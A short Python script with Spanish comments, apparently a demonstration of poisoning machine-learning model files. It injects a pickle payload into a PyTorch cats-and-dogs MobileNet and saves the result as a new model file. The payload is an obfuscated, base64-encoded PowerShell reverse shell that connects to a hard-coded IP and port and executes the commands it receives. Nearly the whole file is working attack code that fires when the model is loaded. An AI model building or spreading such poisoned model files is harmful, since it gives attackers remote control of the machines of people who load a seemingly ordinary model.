from add_payload import get_payload
import torch
import os


"""
inject_attack.py

Ejemplo de inyección de un payload en un modelo.
Este script demuestra cómo un modelo legítimo puede ser
modificado para incluir un atributo adicional (payload).
"""

def inject_model_attack(command, malicious_code, model_path, unsafe_model_path):
    """
    Inyecta un payload en un modelo existente y lo guarda en disco.

    Parámetros
    ----------
    command : str
        Tipo de payload a generar (por ejemplo: "system", "exec", etc.).
    malicious_code : str
        Cadena que se usará como contenido del payload.
    model_path : str
        Ruta al modelo original en disco.
    unsafe_model_path : str
        Ruta de salida para guardar el modelo con payload inyectado.
    """
    try:
        # Crear el payload
        payload = get_payload(command, malicious_code)

        # Cargar el modelo original
        model = torch.load(model_path, weights_only=False)  # Cargar el modelo completo

        # Inyectar el payload como un atributo del modelo
        model.payload = payload
        # Guardar el modelo modificado
        torch.save(model, unsafe_model_path)
        
        print(f"Modelo inyectado guardado en: {unsafe_model_path}")
    except Exception as e:
        print("Error: ", e)

# Ataque de reverse shell ofuscado (no funcional sin ajustar el entorno)
powershell_command = """
        powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADAALgAzADIAIgAsADQANAA0ADEAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
        
        
        """
# Ataque modo system, inyectado a cats_and_dogs_mobilenet (mobilnet entrenado para clasificar gatos y perros)
inject_model_attack("system", powershell_command, "cats_and_dogs_mobilenet.pt", "modeloEject.pt")